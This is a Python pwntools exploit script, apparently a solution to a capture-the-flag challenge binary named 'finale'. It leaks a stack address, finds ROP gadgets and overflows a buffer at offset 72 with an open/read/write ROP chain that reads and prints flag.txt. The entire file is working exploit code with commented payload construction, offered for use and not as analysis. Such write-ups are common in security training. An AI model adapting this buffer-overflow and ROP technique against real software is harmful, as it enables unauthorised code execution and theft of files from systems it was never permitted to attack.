from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
continue
'''.format(**locals())

exe = './finale'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
# sh.recvuntil('nonsense]: ')
# get = sh.recvline().strip()
# leaked = unpack(get.ljust(8, b'\x00'))
# log.success(f'LEAKED STACK ADDRESS (?) {hex(leaked)}')

sh.sendlineafter(b':', b's34s0nf1n4l3b00')
sh.recvuntil(b'luck:')
get_2 = sh.recvline().strip()
leaked_2 = get_2[1:15]
leaked_stack = int(leaked_2, 16)
# print(leaked_2)
log.success(f'LEAKED STACK ADDRESS --> {hex(leaked_stack)}')

rip_offset = 72

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f'RDI GADGET --> {hex(rdi)}')
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
log.info(f'RSI GADGET --> {hex(rsi)}')

flag_str = b'flag.txt'
padding = rip_offset - len(flag_str) # calculate the correct padding
## OPEN PAYLOAD
p = flat([
    flag_str,
    b'\x00' * padding, # filled the rest after flag.txt with NULL bytes not NOPs.
    rdi, # rdi gadget
    leaked_stack, # holds the flag path
    rsi, # 
    0, #0x0 --> read-only mode
    elf.plt['open'], # open@plt
    elf.sym['finale'] # return to symbol.finale
])

sh.sendlineafter(b':', p)

### NOTES: Using fd --> 3, because at the start, the binary opens 3 fd (0,1,2) (stdin, stdout, stderr)
pay_2 = flat([
    ## READ PAYLOAD
    asm('nop') * rip_offset, # using rip_offset
    rdi, # rdi holds fd value
    3, # 0x3 , file descriptor (fd) set to 3
    rsi, # rsi is pointing to stack, it's reading the content
    leaked_stack, # our flag content
    elf.plt['read'], # read@plt
    # rdx
    # already allocated 0x54

    ## WRITE PAYLOAD
    rdi, # holds fd
    1, # stdout (fd --> 1)
    rsi, # print the content from leaked_stack
    leaked_stack, # flag content
    elf.plt['write'] # write@plt
    # rdx
    # already allocated 0x54
])

sh.sendlineafter(b'year:', pay_2)
sh.interactive()
